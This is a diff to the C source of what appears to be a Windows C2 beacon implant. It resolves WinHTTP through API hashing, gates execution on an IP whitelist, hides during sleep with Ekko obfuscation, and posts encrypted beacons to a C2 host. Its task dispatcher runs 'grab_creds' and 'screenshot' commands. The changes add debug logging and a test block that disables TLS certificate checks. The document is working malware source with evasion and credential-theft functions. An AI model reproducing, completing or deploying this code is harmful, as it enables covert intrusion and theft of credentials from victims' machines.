@@ -90,10 +90,7 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD funcHash) {
   return NULL;
 }
 
-// ============================================================
-// SECTION 2 — IP WHITELIST GATE
-// Mod 21, 73
-// ============================================================
+
 
  ULONG GetCurrentIpAddress(VOID) {
   INTERFACE_INFO Interfaces[10] = {0};
@@ -136,10 +133,7 @@ BOOL ip_whitelist_gate(VOID) {
   return FALSE;   // unreachable — satisfies compiler
 }
 
-// ============================================================
-// SECTION 3 — CONNECTION CHECK
-// Mod 30
-// ============================================================
+
 
 BOOL checking_connection(BOOL *Connection) {
   *Connection = FALSE;
@@ -155,7 +149,7 @@ BOOL checking_connection(BOOL *Connection) {
   if (!hSession)
     goto cleanup;
 
-  hConnect = WinHttpConnect(hSession, C2_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
+  hConnect = WinHttpConnect(hSession, C2_HOST, CALLBACK_PORT, 0);
   if (!hConnect)
     goto cleanup;
 
@@ -164,6 +158,14 @@ BOOL checking_connection(BOOL *Connection) {
                          WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
   if (!hRequest)
     goto cleanup;
+#ifdef BEACON_TEST
+  DWORD dwFlags1 = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+  WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags1,
+                   sizeof(dwFlags1));
+#endif
 
   if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
@@ -190,10 +192,6 @@ cleanup:
   return *Connection;
 }
 
-// ============================================================
-// SECTION 4 — EKKO SLEEP OBFUSCATION
-// Mod 144, 145
-// ============================================================
 
 static ULONG Random32(VOID) {
   unsigned int Seed = 0;
@@ -348,10 +346,7 @@ VOID ekko_sleep(DWORD sleepMs) {
   EkkoObf(&g_Win32Api, sleepMs);
 }
 
-// ============================================================
-// SECTION 5 — BEACON POST (encrypted, hashed WinHTTP)
-// Mod 30, 19, 55
-// ============================================================
+
 
 BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
                  DWORD *responseLenOut) {
@@ -378,15 +373,17 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
   }
 
   // resolve WinHTTP module via hash
+  // resolve WinHTTP module via hash
   hWinHttp = GetModuleHandleH(WINHTTP_DLL_HASH);
+  printf("[COMMS] GetModuleHandleH: %p\n", hWinHttp);
   if (!hWinHttp)
     hWinHttp = LoadLibraryA("winhttp.dll");
   if (!hWinHttp) {
     printf("[!] winhttp.dll not found\n");
     goto CLEANUP;
   }
+  printf("[COMMS] winhttp.dll loaded at %p\n", hWinHttp);
 
-  // resolve all WinHTTP function pointers via hash
   fnWinHttpOpen pOpen =
       (fnWinHttpOpen)GetProcAddressH(hWinHttp, WinHttpOpen_HASH);
   fnWinHttpConnect pConnect =
@@ -404,13 +401,18 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
   fnWinHttpQueryHeaders pQuery = (fnWinHttpQueryHeaders)GetProcAddressH(
       hWinHttp, WinHttpQueryHeaders_HASH);
 
+  printf("[COMMS] Hash resolution: Open=%p Connect=%p OpenReq=%p Send=%p\n",
+         pOpen, pConnect, pOpenReq, pSend);
+  printf("[COMMS] Hash resolution: Recv=%p Read=%p Close=%p Query=%p\n", pRecv,
+         pRead, pClose, pQuery);
+
   if (!pOpen || !pConnect || !pOpenReq || !pSend || !pRecv || !pRead ||
       !pClose || !pQuery) {
     printf("[!] WinHTTP hash resolution failed\n");
     goto CLEANUP;
   }
 
-  // open session → connect → POST request
+  
   hSession = pOpen(C2_USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
   if (!hSession)
@@ -419,27 +421,51 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
   hConnect = pConnect(hSession, C2_HOST, C2_PORT, 0);
   if (!hConnect)
     goto CLEANUP;
-
   hRequest = pOpenReq(hConnect, L"POST", C2_ENDPOINT, NULL, WINHTTP_NO_REFERER,
                       WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-  if (!hRequest)
+  if (!hRequest) {
+    printf("[!] pOpenReq FAILED: %lu\n", GetLastError());
     goto CLEANUP;
+  }
+  printf("[COMMS] pOpenReq OK\n");
 
+#ifdef BEACON_TEST
+  printf("[COMMS] Setting cert bypass flags\n");
+  DWORD dwFlags2 = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+  if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags2,
+                        sizeof(dwFlags2)))
+    printf("[!] WinHttpSetOption FAILED: %lu\n", GetLastError());
+  else
+    printf("[COMMS] Cert bypass set OK\n");
+#endif
+
+  printf("[COMMS] Sending %lu encrypted bytes to %S:%d%S\n", dwEncryptSize,
+         C2_HOST, C2_PORT, C2_ENDPOINT);
   if (!pSend(hRequest, L"Content-Type: application/octet-stream\r\n",
-             (DWORD)-1L, pEncrypted, dwEncryptSize, dwEncryptSize, 0))
+             (DWORD)-1L, pEncrypted, dwEncryptSize, dwEncryptSize, 0)) {
+    printf("[!] pSend FAILED: %lu\n", GetLastError());
     goto CLEANUP;
+  }
+  printf("[COMMS] pSend OK\n");
 
-  if (!pRecv(hRequest, NULL))
+  if (!pRecv(hRequest, NULL)) {
+    printf("[!] pRecv FAILED: %lu\n", GetLastError());
     goto CLEANUP;
+  }
+  printf("[COMMS] pRecv OK\n");
 
   pQuery(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
          WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
          WINHTTP_NO_HEADER_INDEX);
+  printf("[COMMS] HTTP status: %lu\n", statusCode);
 
   if (statusCode != 200) {
     bSuccess = TRUE;
     goto CLEANUP;
-  } // no task
+  }
 
   // read response body in chunks
   do {
@@ -494,9 +520,7 @@ CLEANUP:
   return bSuccess;
 }
 
-// ============================================================
-// SECTION 6 — JITTER
-// ============================================================
+
 
 DWORD jitter(DWORD baseMs) {
   DWORD variation = (baseMs * JITTER_PERCENT) / 100;
@@ -507,9 +531,7 @@ DWORD jitter(DWORD baseMs) {
   return baseMs - variation + (rnd % (2 * variation));
 }
 
-// ============================================================
-// SECTION 7 — TASK DISPATCH
-// ============================================================
+
 
 static BOOL json_get_string(const CHAR *json, const CHAR *key, CHAR *out,
                             DWORD outMax) {
@@ -586,7 +608,7 @@ VOID dispatch_task(BYTE *taskBlob, DWORD taskBlobLen) {
   printf("[*] task id=%s cmd=%s args=%s\n", taskId, command,
          hasArgs ? args : "(null)");
 
-  // ── dispatch ─────────────────────────────────────────────────
+  // dispatch 
   if (strcmp(command, "grab_creds") == 0 ||
       strcmp(command, "screenshot") == 0) {
     postex_run(command);
